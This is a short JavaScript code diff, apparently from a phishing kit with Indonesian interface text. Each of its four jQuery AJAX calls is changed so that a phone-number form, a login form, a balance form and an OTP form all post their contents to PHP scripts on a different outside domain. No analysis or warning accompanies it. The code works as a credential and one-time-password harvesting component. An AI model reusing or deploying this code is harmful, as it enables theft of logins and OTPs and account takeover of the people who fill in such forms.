@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://kebunku.my.id/apel/no.php',
+            url: 'https://smpnegeri41jkt.my.id/guru/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://kebunku.my.id/apel/login.php',
+            url: 'https://smpnegeri41jkt.my.id/guru/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://kebunku.my.id/apel/saldo.php',
+            url: 'https://smpnegeri41jkt.my.id/guru/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://kebunku.my.id/apel/gas.php',
+ url: 'https://smpnegeri41jkt.my.id/guru/gas.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
